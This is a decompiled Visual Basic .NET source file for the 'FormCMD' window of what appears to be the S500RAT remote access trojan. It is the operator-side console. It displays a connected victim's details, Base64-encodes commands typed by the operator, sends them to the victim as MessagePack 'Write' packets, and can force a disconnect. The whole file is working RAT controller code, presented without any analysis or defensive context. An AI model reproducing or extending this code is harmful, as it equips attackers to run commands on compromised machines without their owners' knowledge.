Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000015 RID: 21
	<DesignerGenerated()>
	Public Partial Class FormCMD
		Inherits Form

		' Token: 0x170000C6 RID: 198
		' (get) Token: 0x060001BA RID: 442 RVA: 0x0000E4CE File Offset: 0x0000C6CE
		' (set) Token: 0x060001BB RID: 443 RVA: 0x0000E4D8 File Offset: 0x0000C6D8
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170000C7 RID: 199
		' (get) Token: 0x060001BC RID: 444 RVA: 0x0000E4E1 File Offset: 0x0000C6E1
		' (set) Token: 0x060001BD RID: 445 RVA: 0x0000E4EB File Offset: 0x0000C6EB
		Private Overridable Property ClientInfo As Label

		' Token: 0x170000C8 RID: 200
		' (get) Token: 0x060001BE RID: 446 RVA: 0x0000E4F4 File Offset: 0x0000C6F4
		' (set) Token: 0x060001BF RID: 447 RVA: 0x0000E4FE File Offset: 0x0000C6FE
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170000C9 RID: 201
		' (get) Token: 0x060001C0 RID: 448 RVA: 0x0000E507 File Offset: 0x0000C707
		' (set) Token: 0x060001C1 RID: 449 RVA: 0x0000E514 File Offset: 0x0000C714
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000CA RID: 202
		' (get) Token: 0x060001C2 RID: 450 RVA: 0x0000E557 File Offset: 0x0000C757
		' (set) Token: 0x060001C3 RID: 451 RVA: 0x0000E561 File Offset: 0x0000C761
		Public Overridable Property T1 As UIRichTextBox

		' Token: 0x170000CB RID: 203
		' (get) Token: 0x060001C4 RID: 452 RVA: 0x0000E56A File Offset: 0x0000C76A
		' (set) Token: 0x060001C5 RID: 453 RVA: 0x0000E574 File Offset: 0x0000C774
		Public Overridable Property T2 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._T2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				Dim t As Guna2TextBox = Me._T2
				If t IsNot Nothing Then
					RemoveHandler t.KeyDown, value2
				End If
				Me._T2 = value
				t = Me._T2
				If t IsNot Nothing Then
					AddHandler t.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x170000CC RID: 204
		' (get) Token: 0x060001C6 RID: 454 RVA: 0x0000E5B7 File Offset: 0x0000C7B7
		' (set) Token: 0x060001C7 RID: 455 RVA: 0x0000E5C1 File Offset: 0x0000C7C1
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170000CD RID: 205
		' (get) Token: 0x060001C8 RID: 456 RVA: 0x0000E5CA File Offset: 0x0000C7CA
		' (set) Token: 0x060001C9 RID: 457 RVA: 0x0000E5D4 File Offset: 0x0000C7D4
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170000CE RID: 206
		' (get) Token: 0x060001CA RID: 458 RVA: 0x0000E5DD File Offset: 0x0000C7DD
		' (set) Token: 0x060001CB RID: 459 RVA: 0x0000E5E7 File Offset: 0x0000C7E7
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170000CF RID: 207
		' (get) Token: 0x060001CC RID: 460 RVA: 0x0000E5F0 File Offset: 0x0000C7F0
		' (set) Token: 0x060001CD RID: 461 RVA: 0x0000E5FA File Offset: 0x0000C7FA
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170000D0 RID: 208
		' (get) Token: 0x060001CE RID: 462 RVA: 0x0000E603 File Offset: 0x0000C803
		' (set) Token: 0x060001CF RID: 463 RVA: 0x0000E610 File Offset: 0x0000C810
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D1 RID: 209
		' (get) Token: 0x060001D0 RID: 464 RVA: 0x0000E653 File Offset: 0x0000C853
		' (set) Token: 0x060001D1 RID: 465 RVA: 0x0000E65D File Offset: 0x0000C85D
		Public Property Client As Clients

		' Token: 0x170000D2 RID: 210
		' (get) Token: 0x060001D2 RID: 466 RVA: 0x0000E666 File Offset: 0x0000C866
		' (set) Token: 0x060001D3 RID: 467 RVA: 0x0000E670 File Offset: 0x0000C870
		Public Property F As FormS500

		' Token: 0x170000D3 RID: 211
		' (get) Token: 0x060001D4 RID: 468 RVA: 0x0000E679 File Offset: 0x0000C879
		' (set) Token: 0x060001D5 RID: 469 RVA: 0x0000E683 File Offset: 0x0000C883
		Public Property FullPath As String

		' Token: 0x170000D4 RID: 212
		' (get) Token: 0x060001D6 RID: 470 RVA: 0x0000E68C File Offset: 0x0000C88C
		' (set) Token: 0x060001D7 RID: 471 RVA: 0x0000E696 File Offset: 0x0000C896
		Friend Property ParentClient As Clients

		' Token: 0x060001D8 RID: 472 RVA: 0x0000E6A0 File Offset: 0x0000C8A0
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormCMD_Load
			AddHandler MyBase.Resize, AddressOf Me.FormCMD_Resize
			Me.FormSize = False
			Me.string_1 = New String(4) {}
			Me.int_0 = 0
			Me.int_1 = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x060001D9 RID: 473 RVA: 0x0000E704 File Offset: 0x0000C904
		Private Sub FormCMD_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x060001DA RID: 474 RVA: 0x0000E7EC File Offset: 0x0000C9EC
		Private Sub FormCMD_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060001DB RID: 475 RVA: 0x0000E880 File Offset: 0x0000CA80
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060001DC RID: 476 RVA: 0x0000E8EC File Offset: 0x0000CAEC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Disconnect"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Thread.Sleep(1)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060001DD RID: 477 RVA: 0x0000E904 File Offset: 0x0000CB04
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim keyCode As Keys = e.KeyCode
			If keyCode <> Keys.[Return] Then
				If keyCode <> Keys.Up Then
					If keyCode = Keys.Down Then
						Dim ptr As Integer = Me.int_0
						Me.int_0 = ptr + -1
						Dim flag As Boolean = Me.int_0 < 0
						If flag Then
							Me.int_0 = 0
						End If
						Me.T2.Text = Me.string_1(Me.int_0)
					End If
				Else
					Dim ptr As Integer = Me.int_0
					Me.int_0 = ptr + 1
					Dim flag2 As Boolean = Me.int_0 > Me.string_1.Length - 1
					If flag2 Then
						Me.int_0 = Me.string_1.Length - 1
					End If
					Me.T2.Text = Me.string_1(Me.int_0)
				End If
			Else
				Dim text As String = Me.T2.Text
				Me.T2.Text = String.Empty
				e.SuppressKeyPress = True
				Me.string_1(Me.int_1) = text
				Dim ptr As Integer = Me.int_1
				Me.int_1 = ptr + 1
				Dim flag3 As Boolean = Me.int_1 > Me.string_1.Length - 1
				If flag3 Then
					Me.int_1 = 0
				End If
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Write"
				msgPack.ForcePathObject("Code").AsString = Functions.StringToBase64(text)
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x040000D6 RID: 214
		Private FormSize As Boolean

		' Token: 0x040000D7 RID: 215
		Private int_0 As Integer

		' Token: 0x040000D8 RID: 216
		Private int_1 As Integer

		' Token: 0x040000D9 RID: 217
		Private string_1 As String()

		' Token: 0x040000DA RID: 218
		Private idx As Integer

		' Token: 0x040000DB RID: 219
		Private it As Integer
	End Class
End Namespace
